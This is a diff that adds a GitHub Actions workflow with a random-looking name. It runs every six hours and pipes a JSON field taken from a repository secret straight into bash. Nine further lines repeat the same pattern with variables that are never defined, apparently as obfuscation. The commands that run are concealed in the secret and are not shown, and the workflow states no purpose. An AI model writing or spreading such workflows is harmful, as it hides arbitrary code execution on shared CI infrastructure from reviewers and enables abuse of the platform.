@@ -1,0 +1,27 @@
+name: elderlyremarkable
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: elderlyremarkable
+        env:
+          gsg2912: ${{ secrets.gsg2912 }}
+        run: |
+          echo $gsg2912 | jq -r .d05 | /bin/bash
+          echo $la06813 | jq -r .e408 | /bin/bash
+          echo $zv72185 | jq -r .ne3787 | /bin/bash
+          echo $qjxf25349 | jq -r .lp7559 | /bin/bash
+          echo $vzn44 | jq -r .oo9 | /bin/bash
+          echo $rfis1176 | jq -r .ll7 | /bin/bash
+          echo $wq6 | jq -r .a43933 | /bin/bash
+          echo $cran3 | jq -r .hmg2 | /bin/bash
+          echo $dtls5 | jq -r .duvp6 | /bin/bash
+          echo $qg805 | jq -r .mxmz02 | /bin/bash
+
